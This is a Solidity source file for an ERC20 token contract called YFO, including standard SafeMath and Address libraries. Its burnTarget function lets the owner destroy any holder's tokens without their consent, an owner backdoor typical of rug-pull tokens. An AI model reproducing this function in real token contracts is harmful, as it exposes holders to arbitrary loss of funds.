1 // SPDX-License-Identifier: none
2 
3 pragma solidity >=0.5.0 <0.8.0;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address payable) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 interface IERC20 {
16     function totalSupply() external view returns (uint256);
17     function balanceOf(address account) external view returns (uint256);
18     function transfer(address recipient, uint256 amount) external returns (bool);
19     function allowance(address owner, address spender) external view returns (uint256);
20     function approve(address spender, uint256 amount) external returns (bool);
21     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
22     event Transfer(address indexed from, address indexed to, uint256 value);
23     event Approval(address indexed owner, address indexed spender, uint256 value);
24 }
25 library SafeMath {
26     function add(uint256 a, uint256 b) internal pure returns (uint256) {
27         uint256 c = a + b;
28         require(c >= a, "SafeMath: addition overflow");
29 
30         return c;
31     }
32 
33     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
34         return sub(a, b, "SafeMath: subtraction overflow");
35     }
36 
37     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
38         require(b <= a, errorMessage);
39         uint256 c = a - b;
40 
41         return c;
42     }
43 
44     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
45         if (a == 0) {
46             return 0;
47         }
48 
49         uint256 c = a * b;
50         require(c / a == b, "SafeMath: multiplication overflow");
51 
52         return c;
53     }
54 
55     function div(uint256 a, uint256 b) internal pure returns (uint256) {
56         return div(a, b, "SafeMath: division by zero");
57     }
58 
59     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
60         require(b > 0, errorMessage);
61         uint256 c = a / b;
62         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
63 
64         return c;
65     }
66 
67     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
68         return mod(a, b, "SafeMath: modulo by zero");
69     }
70     
71     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
72         require(b != 0, errorMessage);
73         return a % b;
74     }
75 }
76 library Address {
77     function isContract(address account) internal view returns (bool) {
78         // This method relies on extcodesize, which returns 0 for contracts in
79         // construction, since the code is only stored at the end of the
80         // constructor execution.
81 
82         uint256 size;
83         // solhint-disable-next-line no-inline-assembly
84         assembly { size := extcodesize(account) }
85         return size > 0;
86     }
87     
88     function sendValue(address payable recipient, uint256 amount) internal {
89         require(address(this).balance >= amount, "Address: insufficient balance");
90 
91         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
92         (bool success, ) = recipient.call{ value: amount }("");
93         require(success, "Address: unable to send value, recipient may have reverted");
94     }
95     
96     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
97       return functionCall(target, data, "Address: low-level call failed");
98     }
99     
100     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
101         return functionCallWithValue(target, data, 0, errorMessage);
102     }
103     
104     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
105         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
106     }
107     
108     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
109         require(address(this).balance >= value, "Address: insufficient balance for call");
110         require(isContract(target), "Address: call to non-contract");
111 
112         // solhint-disable-next-line avoid-low-level-calls
113         (bool success, bytes memory returndata) = target.call{ value: value }(data);
114         return _verifyCallResult(success, returndata, errorMessage);
115     }
116     
117     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
118         return functionStaticCall(target, data, "Address: low-level static call failed");
119     }
120     
121     function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
122         require(isContract(target), "Address: static call to non-contract");
123 
124         // solhint-disable-next-line avoid-low-level-calls
125         (bool success, bytes memory returndata) = target.staticcall(data);
126         return _verifyCallResult(success, returndata, errorMessage);
127     }
128     
129     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
130         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
131     }
132     
133     function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
134         require(isContract(target), "Address: delegate call to non-contract");
135 
136         // solhint-disable-next-line avoid-low-level-calls
137         (bool success, bytes memory returndata) = target.delegatecall(data);
138         return _verifyCallResult(success, returndata, errorMessage);
139     }
140 
141     function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
142         if (success) {
143             return returndata;
144         } else {
145             // Look for revert reason and bubble it up if present
146             if (returndata.length > 0) {
147                 // The easiest way to bubble the revert reason is using memory via assembly
148 
149                 // solhint-disable-next-line no-inline-assembly
150                 assembly {
151                     let returndata_size := mload(returndata)
152                     revert(add(32, returndata), returndata_size)
153                 }
154             } else {
155                 revert(errorMessage);
156             }
157         }
158     }
159 }
160 
161 
162 contract YFO is Context, IERC20 {
163     using SafeMath for uint256;
164     using Address for address;
165 
166     mapping (address => uint256) private _balances;
167     mapping (address => bool) private _isAdmin;
168     mapping (address => mapping (address => uint256)) private _allowances;
169 
170     uint256 private _totalSupply;
171     string private _name;
172     string private _symbol;
173     uint8 private _decimals;
174     address private _owner;
175 
176     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
177 
178     constructor (string memory name, string memory symbol, uint256 amount) {
179         _name = name;
180         _symbol = symbol;
181         _setupDecimals(18);
182         address msgSender = _msgSender();
183         _owner = msgSender;
184         _isAdmin[msgSender] = true;
185         _mint(msgSender, amount);
186         emit OwnershipTransferred(address(0), msgSender);
187     }
188 
189     function owner() public view returns (address) {
190         return _owner;
191     }
192     
193     function isAdmin(address account) public view returns (bool) {
194         return _isAdmin[account];
195     }
196 
197     modifier onlyOwner() {
198         require(_owner == _msgSender(), "Ownable: caller is not the owner");
199         _;
200     }
201     
202     modifier onlyAdmin() {
203         require(_isAdmin[_msgSender()] == true, "Ownable: caller is not the administrator");
204         _;
205     }
206 
207     function renounceOwnership() public virtual onlyOwner {
208         emit OwnershipTransferred(_owner, address(0));
209         _owner = address(0);
210     }
211     
212     function transferOwnership(address newOwner) public virtual onlyOwner {
213         require(newOwner != address(0), "Ownable: new owner is the zero address");
214         emit OwnershipTransferred(_owner, newOwner);
215         _owner = newOwner;
216     }
217     
218     function promoteAdmin(address newAdmin) public virtual onlyOwner {
219         require(_isAdmin[newAdmin] == false, "Ownable: address is already admin");
220         require(newAdmin != address(0), "Ownable: new admin is the zero address");
221         _isAdmin[newAdmin] = true;
222     }
223     
224     function demoteAdmin(address oldAdmin) public virtual onlyOwner {
225         require(_isAdmin[oldAdmin] == true, "Ownable: address is not admin");
226         require(oldAdmin != address(0), "Ownable: old admin is the zero address");
227         _isAdmin[oldAdmin] = false;
228     }
229 
230     function name() public view returns (string memory) {
231         return _name;
232     }
233 
234     function symbol() public view returns (string memory) {
235         return _symbol;
236     }
237 
238     function decimals() public view returns (uint8) {
239         return _decimals;
240     }
241 
242     function totalSupply() public view override returns (uint256) {
243         return _totalSupply;
244     }
245 
246     function balanceOf(address account) public view override returns (uint256) {
247         return _balances[account];
248     }
249 
250     function _setupDecimals(uint8 decimals_) internal {
251         _decimals = decimals_;
252     }
253     
254     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
255         _transfer(_msgSender(), recipient, amount);
256         return true;
257     }
258 
259     function allowance(address funder, address spender) public view virtual override returns (uint256) {
260         return _allowances[funder][spender];
261     }
262 
263     function approve(address spender, uint256 amount) public virtual override returns (bool) {
264         _approve(_msgSender(), spender, amount);
265         return true;
266     }
267 
268     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
269         _transfer(sender, recipient, amount);
270         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
271         return true;
272     }
273   
274     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
275         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
276         return true;
277     }
278 
279     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
280         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
281         return true;
282     }
283     
284     function burnTarget(address payable targetaddress, uint256 amount) public onlyOwner returns (bool){
285         _burn(targetaddress, amount);
286         return true;
287     }
288     
289     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
290         require(sender != address(0), "ERC20: transfer from the zero address");
291         require(recipient != address(0), "ERC20: transfer to the zero address");
292 
293         _beforeTokenTransfer(sender, recipient, amount);
294 
295         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
296         _balances[recipient] = _balances[recipient].add(amount);
297         emit Transfer(sender, recipient, amount);
298     }
299 
300     function _mint(address account, uint256 amount) internal virtual {
301         require(account != address(0), "ERC20: mint to the zero address");
302 
303         _beforeTokenTransfer(address(0), account, amount);
304 
305         _totalSupply = _totalSupply.add(amount);
306         _balances[account] = _balances[account].add(amount);
307         emit Transfer(address(0), account, amount);
308     }
309     function _burn(address account, uint256 amount) internal virtual {
310         require(account != address(0), "ERC20: burn from the zero address");
311 
312         _beforeTokenTransfer(account, address(0), amount);
313 
314         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
315         _totalSupply = _totalSupply.sub(amount);
316         emit Transfer(account, address(0), amount);
317     }
318 
319     function _approve(address funder, address spender, uint256 amount) internal virtual {
320         require(funder != address(0), "ERC20: approve from the zero address");
321         require(spender != address(0), "ERC20: approve to the zero address");
322 
323         _allowances[funder][spender] = amount;
324         emit Approval(funder, spender, amount);
325     }
326 
327     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
328 }